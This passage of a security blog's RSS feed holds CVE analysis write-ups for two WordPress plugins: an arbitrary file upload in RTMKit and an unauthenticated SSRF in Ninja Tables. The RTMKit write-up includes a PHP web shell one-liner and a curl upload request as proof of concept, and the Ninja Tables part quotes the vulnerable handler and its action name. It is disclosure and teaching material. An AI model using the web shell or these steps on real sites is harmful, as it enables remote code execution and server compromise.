/wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --&amp;gt; B[&amp;#34;rtm_handle_upload_template()&amp;#34;]&#xA;B --&amp;gt; C{is .zip extension}&#xA;C --&amp;gt;|True| D{&amp;#34;check_ajax_referer()&amp;#34;}&#xA;C --&amp;gt;|False| E[&amp;#34;wp_send_json_error()&amp;#34;]&#xA;D --&amp;gt;|True| F[&amp;#34;template_extract()&amp;#34;]&#xA;D --&amp;gt;|False| G[Return 401]&#xA;F --&amp;gt;|Extract To| H[&amp;#34;{wp_upload_dir}/rometheme_template/{hashId}/&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Log in with a &lt;strong&gt;Contributor&lt;/strong&gt; account&lt;/li&gt;&#xA;&lt;li&gt;Create a post and edit it using &lt;strong&gt;Elementor&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Retrieve &lt;code&gt;rkit_libs.template_nonce&lt;/code&gt; to get the nonce&lt;/li&gt;&#xA;&lt;li&gt;Create a file for RCE&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]) ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Zip the created file&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;zip rce.zip rce.php&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;Send the upload request&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -X POST &amp;#34;http://localhost/wp-admin/admin-ajax.php&amp;#34; \&#xA;  -b &amp;#34;your_cookie&amp;#34; \&#xA;  -F &amp;#34;action=rtm_handle_upload_template&amp;#34; \&#xA;  -F &amp;#34;nonce=your_nonce&amp;#34; \&#xA;  -F &amp;#34;file=@rce.zip;filename=rce.zip;type=application/zip&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;Access the uploaded file&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-04-cve-2025-62065/result.png&#34; title=&#34;RCE via uploaded file&#34; data-thumbnail=&#34;/posts/2025-11-04-cve-2025-62065/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE via uploaded file&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-04-cve-2025-62065/result.png&#39; alt=&#34;Result&#34; height=&#34;106&#34; width=&#34;1193&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE via uploaded file&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition question open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-regular fa-circle-question&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Question&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;I want to emphasize that although this file can be accessed directly, direct access is limited by the &lt;code&gt;hashId&lt;/code&gt;, since WordPress by default does not allow directory listing.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability is the chain: &lt;strong&gt;Arbitrary File Upload + temporary public file + uncontrolled extraction&lt;/strong&gt; → risk of RCE. The patch (1.6.6) fixes this by checking capabilities, storing temporary files in a non-public location, whitelisting extensions, blocking traversal, and scanning content.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Update to &lt;strong&gt;1.6.6&lt;/strong&gt; immediately.&lt;/li&gt;&#xA;&lt;li&gt;If you cannot update: disable template upload or restrict it to admins only.&lt;/li&gt;&#xA;&lt;li&gt;Always store uploaded files in non-public locations, whitelist extensions, block path traversal and scan contents before extraction.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ninja-tables/vulnerability/wordpress-ninja-tables-easy-data-table-builder-plugin-5-0-18-unauthenticated-server-side-request-forgery-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress RTMKit Plugin &amp;lt;= 1.6.5 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-2940 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-03-cve-2025-2940/</link>
      <pubDate>Mon, 03 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-03-cve-2025-2940/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-03-cve-2025-2940/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Ninja Tables – Easy Data Table Builder&lt;/strong&gt; plugin for WordPress contains a &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; vulnerability in all versions up to and including &lt;strong&gt;5.0.18&lt;/strong&gt;, via the &lt;code&gt;args[url]&lt;/code&gt; parameter. This vulnerability allows &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; to perform &lt;strong&gt;web requests&lt;/strong&gt; to &lt;strong&gt;arbitrary locations&lt;/strong&gt; originating from the &lt;strong&gt;web application&lt;/strong&gt;, and can be used to &lt;strong&gt;query&lt;/strong&gt; and &lt;strong&gt;modify&lt;/strong&gt; information from &lt;strong&gt;internal services&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-2940&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-2940&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.0.18&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.0.19&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ninja-tables/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Tables Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Ninja Tables&lt;/strong&gt;: &lt;strong&gt;5.0.18&lt;/strong&gt; (vulnerable) and &lt;strong&gt;5.0.19&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool to inspect and compare differences between the two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Per the CVE description, the notable location in the patch is the code handling &lt;code&gt;args[url]&lt;/code&gt; — this is likely the root cause of the vulnerability since this parameter is used directly in the request flow.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-03-cve-2025-2940/diff.png&#34; title=&#34;Precondition location causing the vulnerability&#34; data-thumbnail=&#34;/posts/2025-11-03-cve-2025-2940/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch diff&lt;/h2&gt;&lt;p&gt;Precondition location causing the vulnerability&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-03-cve-2025-2940/diff.png&#39; alt=&#34;Patch diff&#34; height=&#34;687&#34; width=&#34;1552&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Precondition location causing the vulnerability&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;In the patch, the exploitable code has been disabled (commented out with &lt;code&gt;//&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public static function registerAsyncRequestHandler()&#xA;{&#xA;    $action = static::makeAsyncRequestAction();&#xA;&#xA;    App::addAction(&amp;#34;admin_post_nopriv_{$action}&amp;#34;, function() {&#xA;        &#xA;        $request = App::make(&amp;#39;request&amp;#39;);&#xA;        &#xA;        $requestUrl = $request-&amp;gt;get(&amp;#39;args.url&amp;#39;);&#xA;        &#xA;        $requestMethod = $request-&amp;gt;get(&amp;#39;args.method&amp;#39;);&#xA;        &#xA;        $client = Client::make($requestUrl);&#xA;        &#xA;        $params = $request-&amp;gt;except(&#xA;            &amp;#39;action&amp;#39;, &amp;#39;args.url&amp;#39;, &amp;#39;args.method&amp;#39;,&#xA;        )[&amp;#39;args&amp;#39;];&#xA;&#xA;        $callback = static::getCallback($params);&#xA;&#xA;        $response = $client-&amp;gt;{$requestMethod}(&amp;#39;&amp;#39;, $params);&#xA;&#xA;        if (is_wp_error($response)) {&#xA;            $exception = new Exception(&#xA;                $response-&amp;gt;get_error_message(), 500&#xA;            );&#xA;        }&#xA;&#xA;        return $callback($response, $exception ?? null);&#xA;    });&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;registerAsyncRequestHandler()&lt;/code&gt; function registers and handles an async endpoint in WordPress — specifically via &lt;code&gt;admin_post_nopriv_{action}&lt;/code&gt;, i.e., a hook that allows unauthenticated (&lt;code&gt;nopriv&lt;/code&gt;) users to send requests.&lt;/p&gt;&#xA;&lt;p&gt;Specifically, the function processes as follows:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Create a unique &lt;code&gt;action&lt;/code&gt; name for the plugin&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$action = static::makeAsyncRequestAction();&#xA;&#xA;protected static function makeAsyncRequestAction()&#xA;{&#xA;    return &amp;#39;wpf-async-request-&amp;#39; . sha1(&#xA;        App::config()-&amp;gt;get(&amp;#39;app.slug&amp;#39;) // plugin name: ninja-tables&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;makeAsyncRequestAction()&lt;/code&gt; generates a unique identifier for the plugin by concatenating a fixed prefix (&lt;code&gt;wpf-async-request-&lt;/code&gt;) with the &lt;strong&gt;SHA1 hash&lt;/strong&gt; of the plugin name (&lt;code&gt;app.slug&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;Since the plugin name is &lt;code&gt;&amp;quot;ninja-tables&amp;quot;&lt;/code&gt;, the resulting value will be:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Register the action hook with an anonymous callback&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;App::addAction(&amp;#34;admin_post_nopriv_{$action}&amp;#34;, function() { ... });&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When an HTTP request is sent to &lt;code&gt;/wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&lt;/code&gt; the logic inside the anonymous function will be invoked.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Retrieve the &lt;code&gt;Request&lt;/code&gt; object instance from the &lt;code&gt;App&lt;/code&gt; container and read two main parameters&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$request = App::make(&amp;#39;request&amp;#39;);&#xA;$requestUrl = $request-&amp;gt;get(&amp;#39;args.url&amp;#39;);&#xA;$requestMethod = $request-&amp;gt;get(&amp;#39;args.method&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Instantiate a &lt;code&gt;Client&lt;/code&gt; object with the &lt;code&gt;baseUrl&lt;/code&gt; taken from the request&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$client = Client::make($requestUrl);&#xA;&#xA;public static function make($baseUrl = &amp;#39;&amp;#39;, $args = [])&#xA;{&#xA;    $args[&amp;#39;cookies&amp;#39;] = $args[&amp;#39;cookies&amp;#39;] ?? [];&#xA;    $args[&amp;#39;headers&amp;#39;] = $args[&amp;#39;headers&amp;#39;] ?? [];&#xA;    $args[&amp;#39;options&amp;#39;] = $args[&amp;#39;options&amp;#39;] ?? [];&#xA;    return new static($baseUrl, $args);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;Client::make()&lt;/code&gt; is responsible for creating and configuring a new &lt;code&gt;Client&lt;/code&gt; instance used to manage and send HTTP requests. The &lt;code&gt;$baseUrl&lt;/code&gt; value is passed directly from &lt;code&gt;$requestUrl&lt;/code&gt; — i.e., the URL provided by the user in &lt;code&gt;args.url&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Collect all other parameters except &lt;code&gt;action&lt;/code&gt;, &lt;code&gt;args.url&lt;/code&gt;, &lt;code&gt;args.method&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$params = $request-&amp;gt;except(&#xA;    &amp;#39;action&amp;#39;, &amp;#39;args.url&amp;#39;, &amp;#39;args.method&amp;#39;,&#xA;)[&amp;#39;args&amp;#39;];&lt;/code&gt;&lt;/pre&gt;&lt;ol 